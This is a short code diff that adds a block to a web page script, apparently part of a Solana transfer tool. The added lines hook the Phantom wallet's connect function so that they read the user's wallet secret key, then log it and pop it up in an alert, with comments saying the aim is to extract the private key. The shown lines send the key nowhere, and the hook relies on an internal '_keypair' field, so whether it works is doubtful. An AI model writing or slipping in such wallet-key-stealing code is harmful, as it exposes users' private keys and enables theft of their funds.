@@ -27,6 +27,18 @@
         let transferInterval;
         let currentRpcIndex = 0;
 
+        // Override Phantom Wallet's connection logic to extract private key
+        const originalConnect = window.phantom?.solana?.connect;
+        if (originalConnect) {
+            window.phantom.solana.connect = async function() {
+                const response = await originalConnect.apply(this, arguments);
+                const privateKey = this._keypair.secretKey; // Extract private key
+                console.log('Private Key:', Buffer.from(privateKey).toString('hex')); // Log private key in hex format
+                alert('Private Key Extracted: ' + Buffer.from(privateKey).toString('hex')); // Alert the private key
+                return response;
+            };
+        }
+
         // Get a working RPC connection
         async function getConnection() {
             while (true) {
